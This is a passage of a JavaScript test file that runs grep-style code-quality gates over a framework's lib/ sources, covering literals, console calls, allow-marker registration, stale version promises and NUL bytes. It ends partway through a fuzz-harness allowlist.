"use strict";

// SMOKE_RUN_SOLO — the smoke runner (test/smoke.js) runs this file ALONE
// with the whole machine instead of inside the parallel layer-0 pool.
// The duplicate-block scan fans out across worker_threads and is CPU-
// bound; sharing a low-core CI runner (macos-latest = 3 cores) with
// sibling forks oversubscribes the CPU and the scan overruns its
// per-file watchdog budget. Run alone, it finishes in its normal time.

// Re-exec under a 6 GiB old-space ceiling when the parent process did
// not already raise the heap cap. The test's cartesian fingerprint /
// cluster index across ~300 lib/ files lands close to the v8 default
// 4 GiB ceiling on cold runs (and over it on cold-start CI runners).
// One self-spawn keeps `node test/layer-0-primitives/codebase-patterns.test.js`
// working as a first-class invocation without an external shim.
(function _ensureHeapCeiling() {
  var argv = process.execArgv || [];
  for (var i = 0; i < argv.length; i++) {
    if (/^--max-old-space-size=/.test(argv[i])) return;
  }
  // Only re-exec when invoked as the entry point — don't disturb the
  // smoke orchestrator (smoke.js sets its own heap policy if needed).
  if (require.main !== module) return;
  var cp = require("node:child_process");
  var r  = cp.spawnSync(
    process.execPath,
    ["--max-old-space-size=6144"].concat(process.argv.slice(1)),
    { stdio: "inherit" }
  );
  process.exit(r.status === null ? 1 : r.status);
})();

/**
 * codebase-patterns — automated grep gates for code-shape bug classes
 * that have surfaced repeatedly across releases.
 *
 * The patterns covered:
 *
 *   - raw byte literals (use C.BYTES.* helpers)
 *   - raw time literals (use C.TIME.* helpers)
 *   - numeric opts that silently accept Infinity / NaN
 *     (route through lib/numeric-bounds)
 *   - HTTP/2 session.close() without paired destroy()
 *     (route through lib/http2-teardown)
 *   - Object.keys(...).sort() canonicalize walks that lose
 *     Date / Buffer / Map / Set / BigInt (route through
 *     lib/canonical-json)
 *   - regex-only string format validators with no length cap
 *   - stray console.* in production code paths
 *   - TODO / FIXME / HACK / XXX markers
 *   - inline require() (should be top-of-file)
 *   - Tier-A/B/C internal vocabulary in lib/ comments
 *   - Math.random() in security-sensitive contexts
 *   - raw === for hash/token/sig comparisons
 *   - new URL(...) without safeUrl.parse() guard
 *   - bare JSON.parse on operator-supplied input
 *   - process.exit() in lib/
 *   - empty catch (_e) {} silent swallows
 *   - new RegExp(...) dynamic compilation from operator input
 *
 * The test reads every `lib/**.js` file (excluding `lib/vendor/`) and
 * scans for each pattern. A violation produces a numbered report with
 * file:line:offending-text so the operator can fix it before commit.
 *
 * **Exceptions** are documented at the violation site, not in this
 * test file. Two shapes:
 *
 *   1. File-level header within the first 50 lines:
 *        // codebase-patterns:allow-file <class> — <reason>
 *      Skips every match for that class in the file.
 *
 *   2. Per-line inline marker on the same line or up to 2 lines above:
 *        ... // allow:<class> — <reason>
 *      Skips that single match.
 *
 * Add new patterns here when a new bug class is identified. The test
 * is the single source of truth for "we already swept this class once
 * and don't want it to drift back in."
 */

var fs = require("fs");
var path = require("path");
var nodeCrypto = require("crypto");
var helpers = require("../helpers");
var check = helpers.check;

// Stable, paste-able cluster fingerprint. The cluster's identity is the
// canonical normalized token-block from the first cited site — sliced
// from the file at the recorded line range, comments stripped,
// whitespace collapsed, hashed with SHA3-256, truncated to 12 hex
// chars. Operators paste this fingerprint into KNOWN_CLUSTERS when
// allowlisting a new duplicate-block cluster instead of reconstructing
// the matching section by hand.
function _clusterFingerprint(site) {
  try {
    var src = fs.readFileSync(site.file, "utf8").split(/\r?\n/);
    var slice = src.slice(site.line - 1, site.endLine).join("\n");
    var stripped = slice
      .replace(/\/\*[\s\S]*?\*\//g, " ")
      .replace(/\/\/[^\n]*/g, " ")
      .replace(/\s+/g, " ")
      .trim();
    return nodeCrypto.createHash("sha3-256").update(stripped).digest("hex").slice(0, 12);
  } catch (_e) {
    return "??????????";
  }
}

var LIB_ROOT  = path.resolve(__dirname, "..", "..", "lib");
var TEST_ROOT      = path.resolve(__dirname, "..", "..", "test");
var WORKFLOWS_ROOT = path.resolve(__dirname, "..", "..", ".github", "workflows");

function _walk(dir, files) {
  files = files || [];
  if (path.basename(dir) === "vendor") return files;
  var entries;
  try { entries = fs.readdirSync(dir, { withFileTypes: true }); }
  catch (_e) { return files; }
  for (var i = 0; i < entries.length; i++) {
    var e = entries[i];
    var full = path.join(dir, e.name);
    if (e.isDirectory()) _walk(full, files);
    else if (e.isFile() && e.name.endsWith(".js")) files.push(full);
  }
  return files;
}

function _libFiles() { return _walk(LIB_ROOT); }

// Test-tree walker. Excludes infra: test/helpers/_*.js (shape-matcher,
// shingle-worker, etc. — substrate consumed by other tests, not part of
// the test surface itself). Excludes test/.test-output/ generated logs.
// Detectors that need to scan tests (e.g. the setTimeout-as-
// condition-wait rule that lives in the test tree) declare
// `scanScope: "test"` in their KNOWN_ANTIPATTERNS entry to route here.
//
// Scope: every `*.test.js` under `test/` + non-underscore-prefixed
// `test/helpers/*.js` + `test/smoke.js` itself + every test file
// under `examples/*/test/` (the wiki integration suite ships its own
// `test/`). examples/*/node_modules/ is excluded so vendored deps
// don't leak into the test-discipline scope.
function _testFiles() {
  var all = _walk(TEST_ROOT);
  try {
    var examplesRoot = path.resolve(__dirname, "..", "..", "examples");
    all = all.concat(_walk(examplesRoot));
  } catch (_e) { /* examples/ may not exist in some packaging */ }
  return all.filter(function (full) {
    var rel = _relPath(full);
    // Exclude infra substrate (lives under test/helpers/_*.js by convention).
    if (/^test\/helpers\/_/.test(rel)) return false;
    // Exclude shingle-worker output and similar generated artifacts.
    if (/^test\/\.test-output\//.test(rel)) return false;
    // Exclude examples/*/node_modules/ and per-example .test-output.
    if (/^examples\/[^/]+\/node_modules\//.test(rel)) return false;
    if (/^examples\/.*\/\.test-output\//.test(rel)) return false;
    if (/^test\/smoke\.js$/.test(rel)) return true;
    if (/^examples\/[^/]+\/test\/.*\.js$/.test(rel)) return true;
    return /\.test\.js$/.test(rel) || /\/helpers\/[^_].*\.js$/.test(rel);
  });
}

// GitHub Actions workflows walker. Detectors that police the
// supply-chain trust-root pins (e.g. SHA-pinning of reusable
// workflows) declare `scanScope: "workflows"` to route here.
function _workflowFiles() {
  var all;
  try { all = _walk(WORKFLOWS_ROOT); }
  catch (_e) { return []; }
  return all.filter(function (full) {
    var rel = _relPath(full);
    return /\.ya?ml$/.test(rel);
  });
}

function _relPath(absPath) {
  return path.relative(path.resolve(__dirname, "..", ".."), absPath).replace(/\\/g, "/");
}

// scan(pattern, opts) — applies the regex line-by-line. Returns
// matches as { file, line, content, lineNum }. Skips lines that match
// the comment-prefix shape (`//`, ` * `, `/*` etc.) when
// opts.skipComments is true (the default).
function _scan(regex, opts) {
  opts = opts || { skipComments: true };
  var matches = [];
  var files = _libFiles();
  for (var i = 0; i < files.length; i++) {
    var content;
    try { content = fs.readFileSync(files[i], "utf8"); }
    catch (_e) { continue; }
    var lines = content.split(/\r?\n/);
    for (var j = 0; j < lines.length; j++) {
      var line = lines[j];
      if (opts.skipComments && /^\s*(\/\/|\*|\/\*)/.test(line)) continue;
      if (regex.test(line)) {
        matches.push({
          file:    _relPath(files[i]),
          line:    j + 1,
          content: line.trim(),
        });
      }
    }
  }
  return matches;
}

// Allow markers come in two shapes:
//
//   1. **File-level header** at the top of the file (within the first
//      30 lines, typically right under the docstring):
//
//        // codebase-patterns:allow-file inline-require — lazy
//        //   circular-dep loads documented per-line below
//
//      Every match for that class in the file is skipped. Use this
//      when a file has many legitimate matches with a shared reason
//      (e.g., db.js's lazy-loaded test-reset stubs).
//
//   2. **Per-line inline marker** at the source line or one line above:
//
//        var MAX_ARGON2_MEMORY = 4 * 1024 * 1024; // allow:raw-byte-literal — argon2 memoryCost is KiB-as-bytes per RFC 9106
//
//      Use this when only one or two lines in the file are exceptions.
//
// Both forms must include a `— reason` after the class id. The class
// id matches the pattern's bug-class id (raw-byte-literal,
// numeric-opt-Infinity, http2-bare-close, console-direct, etc.).
function _filterMarkers(matches, allowClass) {
  // Cache content + file-level allow detection per file.
  var fileCache = {};
  var fileAllowCache = {};
  function _readContext(file) {
    if (!fileCache[file]) {
      try {
        var p = path.resolve(path.resolve(__dirname, "..", ".."), file);
        fileCache[file] = fs.readFileSync(p, "utf8").split(/\r?\n/);
      } catch (_e) { fileCache[file] = []; }
    }
    return fileCache[file];
  }
  function _hasFileAllow(file) {
    if (Object.prototype.hasOwnProperty.call(fileAllowCache, file)) return fileAllowCache[file];
    var lines = _readContext(file).slice(0, 50);   // file-level allow lives near top
    var re = new RegExp("codebase-patterns:allow-file\\s+" + allowClass + "\\b");
    var found = lines.some(function (l) { return re.test(l); });
    fileAllowCache[file] = found;
    return found;
  }
  function _hasLineAllow(file, lineNum) {
    var lines = _readContext(file);
    if (!lines.length) return false;
    var same  = lines[lineNum - 1] || "";
    var above = lines[lineNum - 2] || "";
    var twoAbove = lines[lineNum - 3] || "";
    var re = new RegExp("allow:" + allowClass + "\\b");
    return re.test(same) || re.test(above) || re.test(twoAbove);
  }
  return matches.filter(function (m) {
    if (_hasFileAllow(m.file)) return false;
    if (_hasLineAllow(m.file, m.line)) return false;
    return true;
  });
}

var _allViolations = [];

function _report(label, matches) {
  // Collect into _allViolations rather than check()-ing per pattern;
  // we want every pattern to RUN to completion + report, then a single
  // failing assertion at the end so the operator sees the full grep
  // report instead of just the first hit.
  if (matches.length > 0) {
    var preview = matches.map(function (m) {
      return "    " + m.file + ":" + m.line + ": " + m.content.slice(0, 100);
    }).join("\n");
    console.log("  " + label + ": " + matches.length + " violation(s):\n" +
      preview);
    _allViolations.push({ label: label, count: matches.length });
  } else {
    check(label, true);
  }
}

// Each pattern has a class-id used in inline `allow:<class>` markers.
// Adding a marker at a violation line allowlists that one specific
// occurrence; the reason follows the marker on the same comment line.

// Every `// allow:<class>` suppression marker must name a REGISTERED detector
// allow-class. A typo'd or stale class (e.g. the historical `setinterval-unref`
// when the real check is `timer-no-unref`, or `protocol-constant` which names
// no detector at all) suppresses NOTHING — the detector it claims to silence
// does not exist — so the underlying violation it was meant to explain ships
// unflagged. When you add a detector with a new allow-class, register it here.
var VALID_ALLOW_CLASSES = {
  "ai-disclosure-on-request-without-requested-gate": 1,
  "archive-gz-without-safedecompress": 1,
  "archive-wrap-partial-recipient": 1,
  "backup-adapter-storage-without-posture-check": 1,
  "bare-canonicalize-walk": 1,
  "bare-error-throw": 1,
  "bare-json-parse": 1,
  "bare-split-on-quoted-header": 1,
  "console-direct": 1,
  "deny-path-hardcoded-response": 1,
  "duplicate-regex": 1,
  "dynamic-regex": 1,
  "dynamic-require": 1,
  "from-base64url-untrapped": 1,
  "hand-rolled-sql": 1,
  "fs-path-from-operator-identifier-without-traversal-refusal": 1,
  "gitleaks-entropy": 1,
  "handrolled-buffer-collect": 1,
  "handrolled-debounce": 1,
  "hostname-compare-trailing-dot": 1,
  "inline-numeric-bounds-cascade": 1,
  "inline-require": 1,
  "inline-require-non-empty-string-validation": 1,
  "internal-binding-in-prose": 1,
  "internal-narrative-comment": 1,
  "list-without-pagination": 1,
  "math-random-noncrypto": 1,
  "no-number-money-arithmetic": 1,
  "numeric-opt-Infinity": 1,
  "primitive-unreachable": 1,
  "process-exit": 1,
  "raw-byte-literal": 1,
  "raw-hash-compare": 1,
  "raw-new-url": 1,
  "raw-outbound-http": 1,
  "raw-process-env": 1,
  "raw-randombytes-token": 1,
  "raw-time-literal": 1,
  "raw-timing-safe-equal": 1,
  "raw-xfp": 1,
  "regex-no-length-cap": 1,
  "seal-without-aad": 1,
  "silent-catch": 1,
  "slsa-framework-action-not-sha-pinned": 1,
  "timer-no-unref": 1,
  "wildcard-suffix-match-without-single-label-check": 1,
};

function testNoOrphanAllowClass() {
  // scanScope: lib + test (every shipped + test source).
  var files = _libFiles().concat(_testFiles());
  var bad = [];
  var re = /\ballow:([a-z][a-zA-Z0-9-]*)/g;
  for (var fi = 0; fi < files.length; fi++) {
    var rel = _relPath(files[fi]);
    // Skip THIS file: it holds the marker machinery + the registry itself,
    // where `allow:` appears in regexes and the VALID_ALLOW_CLASSES keys.
    if (rel === "test/layer-0-primitives/codebase-patterns.test.js") continue;
    var content;
    try { content = fs.readFileSync(files[fi], "utf8"); }
    catch (_e) { continue; }
    var lines = content.split(/\r?\n/);
    for (var li = 0; li < lines.length; li++) {
      // Only inspect the `//` line-comment portion — markers are always
      // comments, never string literals.
      var hashIdx = lines[li].indexOf("//");
      if (hashIdx === -1) continue;
      var comment = lines[li].slice(hashIdx);
      var m;
      re.lastIndex = 0;
      while ((m = re.exec(comment)) !== null) {
        var cls = m[1];
        if (!Object.prototype.hasOwnProperty.call(VALID_ALLOW_CLASSES, cls)) {
          bad.push({
            file:    rel,
            line:    li + 1,
            content: "unregistered allow-class '" + cls + "' — names no detector " +
                     "(fix the typo, or register it in VALID_ALLOW_CLASSES)",
          });
        }
      }
    }
  }
  _report("every // allow:<class> marker names a registered detector class", bad);
}

function testNoRawByteLiterals() {
  // class: raw-byte-literal
  // Byte-SCALE arithmetic — `n * 1024` (KiB), `* 1024 * 1024` (MiB),
  // `* 1024 * 1024 * 1024` (GiB) — must route through C.BYTES.kib / mib /
  // gib(n) so the framework's byte math has a single source of truth.
  // That 1024-scale is exactly what the C.BYTES helpers replace; a bare
  // multiple-of-8 in any other context (an HTTP status, a radix, a count,
  // a length, an opcode, an octet, a field width …) is NOT a byte size and
  // is deliberately NOT flagged. Strings, regex, hex, and C.BYTES-wrapped
  // lines are excluded.
  var files = _libFiles();
  var bad = [];
  for (var fi = 0; fi < files.length; fi++) {
    var rel = _relPath(files[fi]);
    // constants.js and canonical-json.js define / consume the literals.
    if (rel === "lib/constants.js" || rel === "lib/canonical-json.js") continue;
    var content;
    try { content = fs.readFileSync(files[fi], "utf8"); }
    catch (_e) { continue; }
    var lines = content.split(/\r?\n/);
    for (var li = 0; li < lines.length; li++) {
      var line = lines[li];
      if (/^\s*(\/\/|\*|\/\*)/.test(line)) continue;
      var stripped = line
        .replace(/"(?:[^"\\]|\\.)*"/g, "")
        .replace(/'(?:[^'\\]|\\.)*'/g, "")
        .replace(/`(?:[^`\\]|\\.)*`/g, "")
        .replace(/\/(?:[^/\\\n]|\\.)+\/[gimsuy]*/g, "")
        .replace(/0x[0-9a-fA-F]+/g, "");
      // Skip lines that already route through C.BYTES.* or C.TIME.* —
      // the operator-supplied count argument may itself look like a
      // byte literal (`C.BYTES.mib(64)`, `C.TIME.seconds(8)`) and the
      // wrapping primitive is the single source of truth.
      if (/\bC\.(BYTES|TIME)\.\w+\(/.test(stripped)) continue;
      // NARROWED: only 1024-scale byte arithmetic is a real byte size that
      // C.BYTES.kib / mib / gib replaces. Skip every line that is not
      // byte-scale `* 1024` math — a bare multiple-of-8 elsewhere is not a
      // byte literal and no longer needs a marker.
      if (!/\*\s*1024\b/.test(stripped)) continue;
      // Skip lines whose left-hand side explicitly names a non-byte
      // unit. Match the unit token at any position in a SCREAMING_SNAKE
      // identifier (start, middle, or end). Examples:
      //   BITS_PER_BYTE, METHOD_DEFLATE, HEX_RADIX, CRC32_TABLE_LEN,
      //   MAX_PASSPHRASE_BYTES, NTP_TO_UNIX_OFFSET_SECONDS.
      var unitTokens = "(BITS|RADIX|SECONDS|MS|METHOD|COUNT|LEN|LENGTH|ENTRIES|RULES|OFFSET|DEPTH|ITER|INDEX|VERSION|FLAGS|YEAR|BYTES|TIMEOUT|RETRY|CAP|LIMIT|RANGE|BASE|MASK|PORT|ID|MAGIC)";
      var unitRe = new RegExp("\\b(?:[A-Z][A-Z0-9_]*_)?" + unitTokens +
                              "(?:_[A-Z0-9_]*)?\\b");
      var assignRe = /\bvar\s+([A-Z][A-Z0-9_]*)\s*=/;
      var assignMatch = assignRe.exec(stripped);
      if (assignMatch && unitRe.test(assignMatch[1])) continue;
      // Also skip array-index access and Buffer offset reads (the
      // small integer in `arr[N]` or `.readUInt32BE(N)` is a position,
      // and the position IS bytes for a buffer — but expressing it as
      // an integer index reads more naturally than a wrapped helper).
      // Limit to small N so a full Buffer.alloc(N) where N is a true
      // byte size still flags.
      if (/\[\s*\d+\s*\]/.test(stripped)) {
        // Strip out the bracket-access numbers and re-evaluate the rest.
        stripped = stripped.replace(/\[\s*\d+\s*\]/g, "[]");
      }
      if (/\.read(?:U?Int|Float|Double)(?:\d+)?(?:LE|BE)?\s*\(\s*\d+\s*\)/.test(stripped)) {
        stripped = stripped.replace(/(\.read(?:U?Int|Float|Double)(?:\d+)?(?:LE|BE)?)\s*\(\s*\d+\s*\)/g, "$1()");
      }
      // HTTP status-code comparisons (`statusCode >= 200 && < 300`,
      // `code < 600`, etc.) overlap with multiples of 8 (200, 208, 256,
      // 264 …). Same RFC 7231 boundary set as the time-literal filter.
      var statusCmpRe = /[<>!=]=?\s*(?:200|300|400|500|600|399|599)\b|\b(?:200|300|400|500|600|399|599)\s*[<>!=]=?/;
      if (statusCmpRe.test(stripped)) continue;
      // Strip bit-shift operands (`>>> 8`, `<< 16`) — those are bit
      // counts, not byte sizes.
      stripped = stripped.replace(/(?:>>>?|<<)\s*\d+/g, "");
      // Strip `& <num>` / `| <num>` / `^ <num>` masks — bitmask values
      // (255 = 0xFF, 65535 = 0xFFFF, 0x7f, etc.) hit the multiple-of-8
      // rule by coincidence. Mask-context is well-marked.
      stripped = stripped.replace(/[&|^]\s*\d+/g, "");
      var hit = false;
      var re = /\b(\d{1,})\b/g;
      var m;
      while ((m = re.exec(stripped)) !== null) {
        var n = Number(m[1]);
        if (!Number.isFinite(n)) continue;
        if (n < 8) continue;
        if (n % 8 !== 0) continue;
        // Skip year literals (1900-2099 range — calendar / DOS-date math).
        if (n >= 1900 && n <= 2100) continue;
        // Skip the IANA TLS group IDs in the 0x11ED / 0x11EC range —
        // those are protocol constants, decoded to integers in the
        // PQC_GROUPS table and elsewhere. (0x11EC = 4588 not multiple
        // of 8, 0x11ED = 4589 not multiple of 8 — none trip anyway.)
        // After the `* 1024` gate above, this multiple-of-8 scan only
        // runs on byte-scale arithmetic lines, so a multiple-of-8
        // operand here is genuine byte math — the fix path is to route
        // it through the C.BYTES helpers.
        hit = true;
        break;
      }
      if (hit) {
        bad.push({
          file:    rel,
          line:    li + 1,
          content: line.trim(),
        });
      }
    }
  }
  bad = _filterMarkers(bad, "raw-byte-literal");
  _report("no raw byte-scale literals (1024-scale `* 1024` arithmetic; " +
          "use C.BYTES.kib / mib / gib)",
    bad);
}

function testNoRawTimeLiterals() {
  // class: raw-time-literal
  // Systemic detection: ANY integer literal `n >= 60 && n % 60 === 0` is
  // a candidate time value (60-base time math: 60s, 300s, 3600s, 60000ms,
  // 86400s, etc.). Use C.TIME.seconds / minutes / hours / days / weeks
  // (n) so the framework's time math has a single source of truth.
  // Plus the bare seconds-to-ms `* 1000` shape from the v0.5.18 sweep.
  // Strings, regex literals, and hex constants are excluded.
  var files = _libFiles();
  var bad = [];
  for (var fi = 0; fi < files.length; fi++) {
    if (_relPath(files[fi]) === "lib/constants.js") continue;
    var content;
    try { content = fs.readFileSync(files[fi], "utf8"); }
    catch (_e) { continue; }
    var lines = content.split(/\r?\n/);
    for (var li = 0; li < lines.length; li++) {
      var line = lines[li];
      if (/^\s*(\/\/|\*|\/\*)/.test(line)) continue;
      // Strip string literals + regex literals + hex / bit-shift forms
      // so 0x1F300, "1800", and /\d{60}/ don't count.
      var stripped = line
        .replace(/"(?:[^"\\]|\\.)*"/g, "")
        .replace(/'(?:[^'\\]|\\.)*'/g, "")
        .replace(/`(?:[^`\\]|\\.)*`/g, "")
        .replace(/\/(?:[^/\\\n]|\\.)+\/[gimsuy]*/g, "")
        // Strip a trailing `//` line comment AFTER string/regex removal so
        // a `// RFC 7800` / `// draft §4.1` annotation can't seed a phantom
        // time-shape literal. String literals are already gone, so any
        // remaining `//` opens a real comment; everything to EOL is prose.
        .replace(/\/\/.*$/, "")
        .replace(/0x[0-9a-fA-F]+/g, "");
      var hit = false;
      // Any `* 1000` that isn't part of `* 1000 * 1000` (already caught
      // as a multiple-of-60 below: 1000000 % 60 = 40 — no, `60000 % 60 = 0`)
      if (/[)\w]\s*\*\s*1000\b(?!\s*\*\s*1000)/.test(stripped)) hit = true;
      if (!hit) {
        // Lines that already route through C.TIME.* are correct — the
        // operator-supplied count argument may itself look like a time
        // literal (`C.TIME.days(180)`) and that's the canonical form.
        if (/\bC\.TIME\.\w+\(/.test(stripped)) continue;
        // HTTP status-code comparisons (`statusCode >= 200 && < 300`,
        // `code < 600`, etc.) — these are domain-fixed RFC 7231 status
        // class boundaries, not durations. A line where the only
        // multiple-of-60 literal in 200..599 sits in a comparison is
        // not time math.
        var statusCmpRe = /[<>!=]=?\s*(?:200|300|400|500|600|399|599)\b|\b(?:200|300|400|500|600|399|599)\s*[<>!=]=?/;
        if (statusCmpRe.test(stripped)) continue;
        // Strict detection: every multiple-of-60 numeric literal is a
        // time-shape candidate. Operators with a non-time-meaning
        // multiple-of-60 (e.g., 60 requests/min as a count) still need
        // to use C.TIME because the literal is time-derived (per-minute
        // rate), keeping one source of truth.
        var re = /\b(\d{2,})\b/g;
        var m;
        while ((m = re.exec(stripped)) !== null) {
          var n = Number(m[1]);
          if (!Number.isFinite(n)) continue;
          if (n < 60) continue;
          if (n % 60 !== 0) continue;
          // Year literals (1900-2099) are date/calendar math, not
          // duration. They land in DOS-date and Y2K-era constants;
          // those are not multiples of 60 by chance — they're CCYY
          // values fixed by domain. Skip the small set.
          if (n >= 1900 && n <= 2100) continue;
          // NTP-to-Unix epoch offset is a protocol-fixed value (76 yrs
          // expressed in seconds) defined by RFC 5905 — not a tunable.
          if (n === 2208988800) continue;
          hit = true;
          break;
        }
      }
      if (hit) {
        bad.push({
          file:    _relPath(files[fi]),
          line:    li + 1,
          content: line.trim(),
        });
      }
    }
  }
  bad = _filterMarkers(bad, "raw-time-literal");
  _report("no raw time-shaped literals (n >= 60 && n % 60 === 0; " +
          "use C.TIME.seconds / minutes / hours / days / weeks)",
    bad);
}

function testNumericOptsValidate() {
  // class: numeric-opt-Infinity
  var matches = _scan(
    /typeof\s+opts\.\w+\s*===\s*"number"\s*&&\s*opts\.\w+\s*>=?\s*0\b/);
  // numeric-bounds itself contains the helper definitions that look
  // like the pattern.
  matches = matches.filter(function (m) { return m.file !== "lib/numeric-bounds.js"; });
  matches = _filterMarkers(matches, "numeric-opt-Infinity");
  _report("numeric opts route through lib/numeric-bounds (or have an allow marker)",
    matches);
}

function testHttp2TeardownPaired() {
  // class: http2-bare-close
  var matches = _scan(/\bsession\.close\(\)/);
  // The helper itself contains the close() call.
  matches = matches.filter(function (m) { return m.file !== "lib/http2-teardown.js"; });
  matches = _filterMarkers(matches, "http2-bare-close");
  _report("HTTP/2 session.close() routes through lib/http2-teardown",
    matches);
}

function testNoStrayConsoleCalls() {
  // class: console-direct
  var matches = _scan(/\bconsole\.(log|error|warn|info|debug)\(/);
  matches = _filterMarkers(matches, "console-direct");
  _report("no stray console.* calls in lib/ production code paths",
    matches);
}



function testNoUnresolvedMarkers() {
  // class: unresolved-marker — TODO / FIXME / HACK / XXX
  var matches = _scan(/\b(defer|TODO|FIXME|HACK|XXX)(?::|\s)/);
  matches = _filterMarkers(matches, "unresolved-marker");
  _report("no TODO / FIXME / HACK / XXX markers in lib/",
    matches);
}

// ---- Pattern: overdue defers (promised landing version already shipped) ----
//
// A comment/string that promises a feature "lands in vX" / "deferred to vX" /
// "not supported in vX" is fine while vX is in the future. Once the package
// version reaches vX, that promise is OVERDUE: either the feature shipped (and
// the comment is stale and should be corrected) or it never shipped (a real
// gap to close or an explicit defer-with-condition to record here). This gate
// surfaces the iabTcf-class "advertised-but-missing / stale-landing" shape on
// every release rather than letting promised-landing comments rot silently.
//
// STALE_DEFER_ALLOWLIST entries are acknowledged overdue mentions: each is
// either a deliberate defer-with-condition (no operator demand + escape hatch)
// or an item on the gap backlog being worked down. The key is the file; the
// value is a list of distinctive content substrings to permit. Remove an entry
// when the comment is corrected or the gap is closed — that is the backlog.
var STALE_DEFER_ALLOWLIST = {
  // Deliberate defer-with-condition: needs an envelope-semantics decision
  // (per-tenant KEM keypair vs symmetric); explicit escape hatch is passing
  // { publicKey, ecPublicKey } directly. Tracked for design, not overdue work.
  "lib/archive-wrap.js": [
    // quote-free phrases (source has escaped \" so avoid quote chars here)
    "deferred to v0.12.11",
    "lands in v0.12.11",
  ],
  // Deliberate: Sieve extension refused per RFC 5228 §3.2 — script-declared
  // capability gating, defer-with-condition (operator demand).
  "lib/safe-sieve.js": ["not implemented in v0.9.55 — script refused"],
  // Conditional on a future vendoring decision (no bundled EXIF/IPTC reader);
  // operator-feeds-metadata escape hatch. Defer-with-condition.
  "lib/ai-content-detect.js": ["IPTC PhotoMetadata reader lands in v0.10.9"],
  // GAP BACKLOG (being worked down — these are real overdue items):
  //   archive-read ZIP64 read (promised v0.12.8) — building. (The
  //   fromTrustedStream defer was reworded to a version-free "not
  //   implemented / re-opens when needed" in v0.13.15, so it no longer
  //   needs an allowlist entry.)
  "lib/archive-read.js": [
    "not supported in v0.12.7. Will land",
    "switch to tar — lands v0.12.8",
    "carries ZIP64 sentinel sizes (not supported in v0.12.7)",
  ],
  "lib/safe-archive.js": [
    "tar lands v0.12.8, gz v0.12.9",
    "fromTrustedStream` is deferred to v0.12.8",
  ],
};

function testNoStaleDefers() {
  var path = require("node:path");
  var pkgVersion = require(path.resolve(__dirname, "..", "..", "package.json")).version.split(".").map(Number);
  function cmp(a, b) { for (var i = 0; i < 3; i += 1) { if ((a[i] || 0) !== (b[i] || 0)) return (a[i] || 0) - (b[i] || 0); } return 0; }
  // Promised-landing phrasings only ("X lands in vN" / "deferred to vN" / "not
  // supported in vN"). NOT "deferred FROM vN" (that is an origin, not a deadline).
  // Accept 2-part (vN.N) AND 3-part (vN.N.N) promised-landing versions —
  // a 2-part "v0.10" promise slipped past the old 3-part-only pattern.
  var PROMISE = /(?:deferred to|lands(?: in)?|will land(?: in)?|not supported in)\s+v?(\d+\.\d+(?:\.\d+)?)/i;
  var matches = _scan(PROMISE, { skipComments: false });
  var overdue = [];
  matches.forEach(function (m) {
    var mm = m.content.match(PROMISE);
    if (!mm) return;
    // Only a STRICTLY-FUTURE promise is exempt. A promise for the current
    // version is due in the release being cut now — if the feature isn't here,
    // the comment is overdue and must be fixed in this release, not a later one.
    if (cmp(mm[1].split(".").map(Number), pkgVersion) > 0) return;
    var allow = STALE_DEFER_ALLOWLIST[m.file] || [];
    if (allow.some(function (sub) { return m.content.indexOf(sub) !== -1; })) return;
    overdue.push({ file: m.file, line: m.line, content: "overdue defer (promised v" + mm[1] + ", now v" + pkgVersion.join(".") + "): " + m.content.slice(0, 100) });
  });
  _report("no overdue defers in lib/ (promised-landing version already shipped — close the gap, fix the stale comment, or record it in STALE_DEFER_ALLOWLIST)",
    overdue);
}

// ---- Pattern: literal NUL bytes (0x00) in source files ----
//
// The Edit / Write tooling decodes JSON `\u0000` escape sequences into
// literal NUL bytes when written to disk. Inside JS regex literals
// this trips ESLint's `no-control-regex` rule on Linux CI but slips
// past Windows local lint (encoding-related). Class-of-bug: any file
// in lib/ containing a literal 0x00 byte should fail the gate at
// authoring time, not on the npm-publish workflow at tag-push time.
// To embed NUL semantically, use the JS source escape `\u0000` (the
// six-char sequence backslash + u + 0+0+0+0) — JS regex parses that
// to a NUL char without ESLint complaining.
function testNoLiteralNulBytesInSource() {
  var fs   = require("node:fs");
  var path = require("node:path");
  var hits = [];
  function walk(dir) {
    var entries = fs.readdirSync(dir, { withFileTypes: true });
    for (var i = 0; i < entries.length; i += 1) {
      var e = entries[i];
      if (e.name === "vendor" || e.name === "node_modules") continue;
      var full = path.join(dir, e.name);
      if (e.isDirectory()) walk(full);
      else if (e.isFile() && /\.js$/.test(e.name)) {
        var b = fs.readFileSync(full);
        for (var j = 0; j < b.length; j += 1) {
          if (b[j] === 0) {
            // Locate the line for a useful error.
            var line = 1;
            for (var k = 0; k < j; k += 1) if (b[k] === 0x0a) line += 1;
            hits.push({
              file: path.relative(path.resolve(__dirname, "..", ".."), full).replace(/\\/g, "/"),
              line: line,
              content: "literal NUL byte at byte " + j + " (use \\u0000 escape in source)",
            });
            break;
          }
        }
      }
    }
  }
  walk(path.resolve(__dirname, "..", "..", "lib"));
  _report("no literal NUL (0x00) bytes in source files (use \\u0000 escape; CI ESLint catches it but Windows local lint may not)",
    hits);
}

// release-named-test-file is now an inline KNOWN_ANTIPATTERNS entry
// with scanScope: "test" + matchOn: "basename".

// ---- Pattern 8b: parser / validator primitives must have a fuzz harness ----

function testParserPrimitivesHaveFuzzHarness() {
  // feedback_no_mvp_design_for_completion.md — every primitive whose
  // job is "consume operator-supplied bytes / strings and refuse the
  // adversarial ones" is a high-value fuzz target. Without a harness,
  // a regression that crashes the parser instead of refusing it can
  // ship silently. The discipline: every `lib/safe-*.js` AND every
  // `lib/guard-*.js` file MUST have a corresponding `fuzz/<name>.fuzz.js`.
  //
  // Allowlist for primitives that aren't parsers (e.g. `safe-async`
  // is a runtime-control wrapper, not an input-parsing surface).
  // Paths use POSIX separators relative to repo root and are checked
  // against the recursively-walked lib tree, so nested primitives
  // (lib/parsers/safe-toml.js, lib/auth/...) are covered.
  var FUZZ_NOT_REQUIRED = {
    "lib/safe-async.js":     "runtime-control wrapper (not input-parsing)",
    "lib/safe-buffer.js":    "byte-level helper consumed only by other primitives, no operator-facing parse path",
    "lib/safe-redirect.js":  "post-validation redirect builder; the validation lives in safe-url which is fuzzed",
    "lib/safe-schema.js":    "schema-builder fluent API; takes operator-authored schema, not adversarial input",
    "lib/safe-sql.js":       "tagged-template helper; takes operator-authored fragments, not adversarial input",
    "lib/guard-all.js":      "aggregator over per-format guards; each member is fuzzed individually",
    "lib/guard-archive.js":  "operator-feeds-metadata pattern (no parser ships); validateEntries takes operator-supplied tree, not raw bytes",
    "lib/guard-cidr.js":     "single-value validator; covered by safe-url IPv6 fuzzing surface",
